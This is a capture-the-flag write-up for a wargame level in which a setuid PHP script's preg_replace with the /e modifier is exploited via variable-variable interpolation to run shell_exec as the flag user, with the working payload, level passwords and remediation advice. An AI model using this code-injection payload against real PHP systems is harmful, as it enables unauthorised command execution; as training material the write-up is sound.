# Solve Level06
pass : viuaaale9huek52boumoomioc

## Description
- in home
    - -rwsr-x---+ 1 flag06  level06 7503 Aug 30  2015 level06*
    - -rwxr-x---  1 flag06  level06  356 Mar  5  2016 level06.php*

### /home/level06/level06
- is it a binary version of the php file or does this binary execute the php file

### /home/level06/level06.php
- the only usefull line is ```$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);``` we can exploit the e
  - to exploit we have to match [x something ] in the file to pass because of regex
  - 'something' will be executed in y()
- we only need to understand regex in the php file
    - "/e" eval() => execute the code if it's valid php [php officiel][df1] [obsolete since php 5.5.0][df2] (cf Remote Code Execution)
    - use variable variables may help [revelation][df3] [doc][df4]
      - with variable variables we can use interpolation ```${$x}```
      - ```${shell_exec(getflag)}``` ==> failed evaluation code ==> php try to execute but can't
      - ```{${shell_exec(getflag)}}``` ==> undefined variable but getflag is executed !

## Solution
```bash
echo '[x {${shell_exec(getflag)}}]' > /tmp/file
./level06 /tmp/file
```

- no flag
- level07 : wiok45aaoguiboiki2tuin6ub

## Resolve problem
- always sanitize your data
- use the last version of php (e in preg_replace is invalide since 5.5.1 [source][df1])

[df1]: https://www.php.net/manual/en/function.preg-replace.php
[df2]: https://www.lephpfacile.com/manuel-php/reference.pcre.pattern.modifiers.php
[df3]: https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp#variable-variables
[df4]: https://www.php.net/manual/en/language.variables.variable.php